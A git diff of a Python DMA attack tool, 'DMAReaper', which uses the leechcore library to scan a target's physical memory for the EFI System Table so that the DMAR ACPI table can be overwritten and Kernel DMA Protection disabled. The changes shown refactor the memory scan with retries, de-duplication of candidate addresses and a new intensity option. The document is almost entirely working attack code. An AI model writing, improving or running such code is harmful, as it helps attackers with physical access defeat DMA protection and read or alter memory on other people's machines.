@@ -10,7 +10,7 @@ import struct
 import argparse
 import leechcorepyc as leech
 
-# ACPI 2.0 Table GUID in mixed-endian format
+# ACPI 2.0 Table GUID in mixed-endian format (normalized)
 ACPI20_GUID = bytes([
     0x71, 0xE8, 0x68, 0x88,
     0xF1, 0xE4,
@@ -19,7 +19,7 @@ ACPI20_GUID = bytes([
 ])
 
 PAGE_SIZE = 0x1000
-RAM_SIZE = 64 * 1024 * 1024 * 1024  # 64 GB
+RAM_SIZE = 0xffffffff
 DEFAULT_START_ADDR = 0x10000000
 BATCH_SIZE = 100
 EFI_SIG = b'IBI SYST'  # EFI System Table signature (little endian)
@@ -85,37 +85,49 @@ def extract_exit_boot_services(lc, efi_table_data, efi_table_addr):
         debug(f"[!] Exception while parsing EFI structures: {e}")
         return None
 
-def search_for_efi_table():
+def search_for_efi_table(max_attempts=3):
+    print("[*] Searching for EFI Base")
     addresses = list(range(args.min_addr, args.max_addr, PAGE_SIZE * BATCH_SIZE))
+    seen_candidates = set()  # Track already-processed candidate addresses
 
     for base_addr in addresses:
         batch_addrs = [base_addr + i * PAGE_SIZE for i in range(BATCH_SIZE)]
         range_end = batch_addrs[-1] + PAGE_SIZE
 
-        print(f"[*] Scanning range: 0x{base_addr:016X} - 0x{range_end:016X}")
-        pages = lc.read_scatter(batch_addrs)
+        debug(f"[*] Scanning range: 0x{base_addr:016X} - 0x{range_end:016X}")
 
-        for page in pages:
-            addr = page['addr']
-            data = page['data']
-            if not data or len(data) < 0x60:
-                continue
+        for attempt in range(1, max_attempts + 1):
+            pages = lc.read_scatter(batch_addrs)
 
-            if EFI_SIG in data:
-                offset = data.find(EFI_SIG)
-                abs_addr = addr + offset
-                print(f"\n[+] EFI System Table Candidate found at 0x{abs_addr:016X}\n")
-                hexdump(data[offset:offset+0x80], base=abs_addr)
+            for page in pages:
+                addr = page['addr']
+                data = page['data']
+                if not data or len(data) < 0x60:
+                    continue
 
-                result = extract_exit_boot_services(lc, data[offset:], abs_addr)
-                if result:
-                    print("[+] Valid EFI System Table")
-                    return abs_addr
-                else:
-                    print("\n[!] False positive — continuing search...\n")
+                if EFI_SIG in data:
+                    offset = data.find(EFI_SIG)
+                    abs_addr = addr + offset
+
+                    # Skip if we already seen this candidate
+                    if abs_addr in seen_candidates:
+                        continue
+                    seen_candidates.add(abs_addr)
+
+                    print(f"\n[+] EFI System Table Candidate found at 0x{abs_addr:016X}\n")
+                    hexdump(data[offset:offset + 0x80], base=abs_addr)
+
+                    result = extract_exit_boot_services(lc, data[offset:], abs_addr)
+                    if result:
+                        print("[+] Valid EFI System Table")
+                        return abs_addr
+                    else:
+                        print("\n[!] False positive — continuing search...\n")
+                        # Don't break here — allow next attempt to keep scanning other candidates
 
     print("[!] EFI System Table not found in scanned memory.")
     return None
+
 
 def read_bytes(addr: int, size: int) -> bytes:
     data = lc.read(addr, size, True)
@@ -215,16 +227,17 @@ def killDMARACPI(dmar_ptr):
 def parse_args():
     parser = argparse.ArgumentParser(description="DMAReaper — Disable Kernel DMA Protection via DMAR overwrite")
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose debug output")
-    parser.add_argument("-min", "--min-addr", type=lambda x: int(x, 0), default=DEFAULT_START_ADDR, help="Minimum scan address (default: 0x52000000)")
-    parser.add_argument("-max", "--max-addr", type=lambda x: int(x, 0), default=RAM_SIZE, help="Maximum scan address (default: 64GB)")
+    parser.add_argument("-i", "--intensity", type=int, default=3, help="Number of times each memory segment is read during scan. Lower is faster but less reliable. (default: 3)")
+    parser.add_argument("-min", "--min-addr", type=lambda x: int(x, 0), default=DEFAULT_START_ADDR, help="Minimum scan address (default: 0x10000000)")
+    parser.add_argument("-max", "--max-addr", type=lambda x: int(x, 0), default=RAM_SIZE, help="Maximum scan address (default: 0xFFFFFFFF)")
     return parser.parse_args()
 
 def main():
+    print(banner)
     global args
     args = parse_args()
 
-    print(banner)
-    efi_system_table_addr = search_for_efi_table()
+    efi_system_table_addr = search_for_efi_table(max_attempts=args.intensity)
     if not efi_system_table_addr:
         print("[!] EFI System Table not found, aborting.")
         sys.exit(1)
@@ -242,5 +255,4 @@ def main():
     killDMARACPI(dmar_ptr)
 
 if __name__ == "__main__":
-
     main()
